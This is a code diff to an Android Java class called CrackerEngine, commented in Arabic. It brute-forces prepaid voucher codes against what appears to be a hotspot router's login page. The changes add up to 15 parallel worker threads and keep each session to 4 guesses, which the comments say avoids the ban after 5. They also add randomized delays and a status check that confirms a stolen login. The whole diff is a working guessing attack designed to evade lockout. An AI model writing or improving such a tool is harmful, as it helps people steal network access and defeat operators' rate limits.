@@ -14,23 +14,27 @@ public class CrackerEngine {
         void onFound(String voucher, String status);
     }
 
+    // ⚡ 4 محاولات فقط لكل جلسة (نتجنب الحظر بعد 5)
+    private static final int ATTEMPTS_PER_SESSION = 4;
+    
     private final Listener listener;
     private final SharedPreferences prefs;
     private final String network;
     private final String loginUrl, statusUrl, baseUrl;
     private final String prefix, suffix;
-    private final int digits, maxAttempts, pauseMs, retryDelay;
+    private final int digits, maxAttempts, threads;
+    private final int pauseMs, retryDelay;
 
     private final AtomicBoolean stopped = new AtomicBoolean(false);
     private final AtomicBoolean found = new AtomicBoolean(false);
     private final AtomicInteger done = new AtomicInteger(0);
     private final Set<String> tried;
     private final Random rng = new Random();
-    private Thread workerThread;
+    private final List<Thread> workers = new ArrayList<>();
 
     public CrackerEngine(Listener l, SharedPreferences p, String network,
                          String loginUrl, String prefix, String suffix, int digits,
-                         int maxAttempts, int pauseMs, int retryDelay) {
+                         int maxAttempts, int threads, int pauseMs, int retryDelay) {
         this.listener = l; this.prefs = p; this.network = network;
         this.loginUrl = loginUrl;
         try {
@@ -40,7 +44,8 @@ public class CrackerEngine {
         this.prefix = prefix != null ? prefix : "";
         this.suffix = suffix != null ? suffix : "";
         this.digits = digits; this.maxAttempts = maxAttempts;
-        this.pauseMs = Math.max(200, pauseMs);
+        this.threads = Math.max(1, Math.min(threads, 15));
+        this.pauseMs = Math.max(100, pauseMs);
         this.retryDelay = retryDelay;
         this.tried = Collections.synchronizedSet(loadTried());
     }
@@ -56,68 +61,45 @@ public class CrackerEngine {
 
     public void stop() {
         stopped.set(true);
-        if (workerThread != null) workerThread.interrupt();
+        synchronized (workers) {
+            for (Thread t : workers) if (t != null) t.interrupt();
+        }
     }
 
     public void start() {
-        workerThread = new Thread(this::runEngine, "CrackerMain");
-        workerThread.start();
+        new Thread(this::runEngine, "CrackerMain").start();
     }
 
     private void runEngine() {
         try {
-            log("▶ بدء التخمين — جلسة جديدة لكل محاولة");
-            log("  (هذا يتجنب الحظر بعد 5 محاولات)");
+            log("▶ بدء التخمين المحسّن");
+            log("  عدد الخيوط: " + threads);
+            log("  جلسة جديدة كل " + ATTEMPTS_PER_SESSION + " محاولات (تجنب الحظر)");
 
-            log("→ تسجيل خروج لبدء نظيف...");
+            log("→ تسجيل خروج...");
             try {
                 HttpURLConnection c = (HttpURLConnection) new URL(baseUrl + "/logout?erase-cookie=yes&var=callBack").openConnection();
                 c.setConnectTimeout(3000); c.setReadTimeout(3000);
-                c.getResponseCode();
-                c.disconnect();
+                c.getResponseCode(); c.disconnect();
             } catch (Exception e) {}
-            sleep(1500);
+            sleep(1000);
 
             log("  أرقام مجربة سابقاً: " + tried.size());
 
-            int consecutiveBusy = 0;
-
-            while (!stopped.get() && !found.get() && done.get() < maxAttempts) {
-                String v = generate();
-                if (v == null) { log("⚠ نفدت الأرقام"); break; }
-                int cur = done.incrementAndGet();
-                listener.onProgress(cur, maxAttempts, v);
-                log("🔍 " + v);
-
-                Result r = tryFreshSession(v);
-                if (stopped.get() || found.get()) break;
-
-                if (r.busy) {
-                    consecutiveBusy++;
-                    log("  ⏳ الراوتر مشغول، انتظار " + (retryDelay/1000) + "s");
-                    if (consecutiveBusy >= 3) {
-                        log("  🛑 مشغول 3 مرات — انتظار أطول...");
-                        sleep(retryDelay * 2);
-                        consecutiveBusy = 0;
-                    } else {
-                        sleep(retryDelay);
-                    }
-                    continue;
+            synchronized (workers) {
+                workers.clear();
+                for (int i = 0; i < threads; i++) {
+                    final int wid = i;
+                    Thread t = new Thread(() -> workerLoop(wid), "Worker-" + wid);
+                    workers.add(t);
+                    t.start();
+                    sleep(200); // تشغيل متدرج
                 }
-                consecutiveBusy = 0;
+            }
+            log("✓ يعمل الآن " + threads + " خيوط...");
 
-                if (r.error != null && !r.error.equals("stopped")) {
-                    log("  ❌ " + v + " → " + r.error);
-                }
-
-                if (r.success) {
-                    found.set(true);
-                    log("✅✅✅ وجد الكرت: " + v);
-                    listener.onFound(v, r.statusJson);
-                    return;
-                }
-
-                sleep(pauseMs);
+            for (Thread t : new ArrayList<>(workers)) {
+                try { t.join(); } catch (Exception e) {}
             }
 
             if (!found.get() && !stopped.get())
@@ -127,55 +109,108 @@ public class CrackerEngine {
         }
     }
 
-    private Result tryFreshSession(String voucher) {
-        if (stopped.get()) return Result.bad("stopped");
-        Map<String, String> cookies = new HashMap<>();
-        String ua = ua();
+    private void workerLoop(int id) {
+        while (!stopped.get() && !found.get() && done.get() < maxAttempts) {
+            // 1. جلسة جديدة
+            Map<String, String> cookies = new HashMap<>();
+            Map<String, String> template = openSession(cookies);
+            if (template == null) {
+                sleep(1000);
+                continue;
+            }
 
+            // 2. إرسال 4 محاولات في هذه الجلسة (أقل من 5 لتجنب الحظر)
+            boolean sessionBurned = false;
+            for (int i = 0; i < ATTEMPTS_PER_SESSION && !stopped.get() && !found.get(); i++) {
+                if (done.get() >= maxAttempts) return;
+                
+                String v = generate();
+                if (v == null) return;
+                
+                int cur = done.incrementAndGet();
+                listener.onProgress(cur, maxAttempts, v);
+                log("[W" + id + "] 🔍 " + v);
+                
+                Result r = tryLogin(cookies, template, v);
+                if (stopped.get() || found.get()) return;
+                
+                if (r.busy) {
+                    log("[W" + id + "]   ⏳ مشغول — تبديل الجلسة");
+                    sleep(retryDelay);
+                    sessionBurned = true;
+                    break;
+                }
+                
+                if (r.success) {
+                    found.set(true);
+                    log("[W" + id + "] ✅✅✅ " + v);
+                    listener.onFound(v, r.statusJson);
+                    return;
+                }
+                
+                if (r.error != null && !r.error.equals("stopped")) {
+                    log("[W" + id + "]   ❌ " + r.error);
+                }
+                
+                sleep(pauseMs + rng.nextInt(100));
+            }
+            
+            // 3. التخلص من الجلسة، استراحة قصيرة
+            if (!sessionBurned) sleep(300 + rng.nextInt(300));
+        }
+    }
+
+    private Map<String, String> openSession(Map<String, String> cookies) {
+        if (stopped.get()) return null;
+        String ua = ua();
         try {
-            // 1. صفحة البداية (كوكيز جديدة)
+            // الخطوة 1: صفحة البداية
             HttpURLConnection c1 = (HttpURLConnection) new URL(baseUrl + "/").openConnection();
             c1.setConnectTimeout(5000); c1.setReadTimeout(5000);
             c1.setRequestProperty("User-Agent", ua);
-            c1.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
             c1.setRequestProperty("Accept-Language", "ar,en;q=0.9");
             c1.getResponseCode();
             extractCookies(c1, cookies);
             c1.disconnect();
-            if (stopped.get()) return Result.bad("stopped");
+            if (stopped.get()) return null;
 
-            // 2. الفورم
+            // الخطوة 2: صفحة الفورم
             HttpURLConnection c2 = (HttpURLConnection) new URL(loginUrl).openConnection();
             c2.setConnectTimeout(5000); c2.setReadTimeout(5000);
             c2.setRequestProperty("User-Agent", ua);
-            c2.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
             c2.setRequestProperty("Accept-Language", "ar,en;q=0.9");
-            String ck1 = cookiesStr(cookies);
-            if (!ck1.isEmpty()) c2.setRequestProperty("Cookie", ck1);
+            String ck = cookiesStr(cookies);
+            if (!ck.isEmpty()) c2.setRequestProperty("Cookie", ck);
             String html = read(c2.getInputStream());
             extractCookies(c2, cookies);
             c2.disconnect();
-            if (stopped.get()) return Result.bad("stopped");
 
-            Map<String, String> fields = extractFields(html);
-            if (fields == null) return Result.bad("لا يوجد form في الصفحة");
+            return extractFields(html);
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+    private Result tryLogin(Map<String, String> cookies, Map<String, String> template, String voucher) {
+        if (stopped.get()) return Result.bad("stopped");
+        String ua = ua();
+        try {
+            Map<String, String> fields = new LinkedHashMap<>(template);
             fields.put("username", voucher);
             fields.put("password", "");
 
-            // 3. إرسال
-            HttpURLConnection c3 = (HttpURLConnection) new URL(loginUrl).openConnection();
-            c3.setRequestMethod("POST");
-            c3.setDoOutput(true);
-            c3.setInstanceFollowRedirects(false);
-            c3.setConnectTimeout(8000); c3.setReadTimeout(8000);
-            c3.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-            c3.setRequestProperty("User-Agent", ua);
-            c3.setRequestProperty("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
-            c3.setRequestProperty("Accept-Language", "ar,en;q=0.9");
-            c3.setRequestProperty("Referer", loginUrl);
-            c3.setRequestProperty("Origin", baseUrl);
-            String ck2 = cookiesStr(cookies);
-            if (!ck2.isEmpty()) c3.setRequestProperty("Cookie", ck2);
+            HttpURLConnection c = (HttpURLConnection) new URL(loginUrl).openConnection();
+            c.setRequestMethod("POST");
+            c.setDoOutput(true);
+            c.setInstanceFollowRedirects(false);
+            c.setConnectTimeout(8000); c.setReadTimeout(8000);
+            c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            c.setRequestProperty("User-Agent", ua);
+            c.setRequestProperty("Accept-Language", "ar,en;q=0.9");
+            c.setRequestProperty("Referer", loginUrl);
+            c.setRequestProperty("Origin", baseUrl);
+            String ck = cookiesStr(cookies);
+            if (!ck.isEmpty()) c.setRequestProperty("Cookie", ck);
 
             StringBuilder sb = new StringBuilder();
             for (Map.Entry<String, String> e : fields.entrySet()) {
@@ -184,47 +219,52 @@ public class CrackerEngine {
                   .append("=")
                   .append(URLEncoder.encode(e.getValue(), "UTF-8"));
             }
-            OutputStream os = c3.getOutputStream();
+            OutputStream os = c.getOutputStream();
             os.write(sb.toString().getBytes("UTF-8"));
             os.flush(); os.close();
 
-            int code = c3.getResponseCode();
-            extractCookies(c3, cookies);
+            int code = c.getResponseCode();
+            extractCookies(c, cookies);
             String body = "";
             try {
-                InputStream is = (code >= 400) ? c3.getErrorStream() : c3.getInputStream();
+                InputStream is = (code >= 400) ? c.getErrorStream() : c.getInputStream();
                 if (is != null) body = read(is);
             } catch (Exception e) {}
-            c3.disconnect();
+            c.disconnect();
+
             if (stopped.get()) return Result.bad("stopped");
 
-            String lowBody = body.toLowerCase();
-            if (body.contains("already authorizing") || lowBody.contains("already authorizing")) {
+            String low = body.toLowerCase();
+            if (body.contains("already authorizing") || low.contains("already authorizing"))
                 return Result.busy("already authorizing");
-            }
-            if (lowBody.contains("invalid") || lowBody.contains("error")
-                || lowBody.contains("wrong") || lowBody.contains("denied")) {
+            
+            if (low.contains("invalid") || low.contains("error") 
+                || low.contains("wrong") || low.contains("denied")) {
                 String msg = extractErr(body);
-                return Result.bad(msg != null ? msg : "خاطئ");
+                return Result.bad(msg != null ? msg : "invalid");
             }
 
-            // 4. تحقق
-            sleep(100);
-            HttpURLConnection c4 = (HttpURLConnection) new URL(statusUrl).openConnection();
-            c4.setConnectTimeout(5000); c4.setReadTimeout(5000);
-            c4.setRequestProperty("User-Agent", ua);
-            String ck3 = cookiesStr(cookies);
-            if (!ck3.isEmpty()) c4.setRequestProperty("Cookie", ck3);
-            String statusBody = read(c4.getInputStream());
-            c4.disconnect();
+            // فقط إذا لم يكن هناك خطأ صريح، نفحص الحالة
+            if (code == 302 || code == 303 || code == 200) {
+                sleep(80);
+                HttpURLConnection c4 = (HttpURLConnection) new URL(statusUrl).openConnection();
+                c4.setConnectTimeout(4000); c4.setReadTimeout(4000);
+                c4.setRequestProperty("User-Agent", ua);
+                String ck2 = cookiesStr(cookies);
+                if (!ck2.isEmpty()) c4.setRequestProperty("Cookie", ck2);
+                String statusBody = read(c4.getInputStream());
+                c4.disconnect();
 
-            JSONObject o = new JSONObject(statusBody);
-            String li = o.optString("logged_in", "").toLowerCase();
-            String un = o.optString("username", "").trim();
-            if ((li.equals("yes") || li.equals("true") || li.equals("1")) && voucher.equals(un))
-                return Result.ok(statusBody);
+                try {
+                    JSONObject o = new JSONObject(statusBody);
+                    String li = o.optString("logged_in", "").toLowerCase();
+                    String un = o.optString("username", "").trim();
+                    if ((li.equals("yes") || li.equals("true") || li.equals("1")) && voucher.equals(un))
+                        return Result.ok(statusBody);
+                } catch (Exception e) {}
+            }
+            
             return Result.bad(null);
-
         } catch (Exception e) {
             return Result.bad("network: " + e.getMessage());
         }
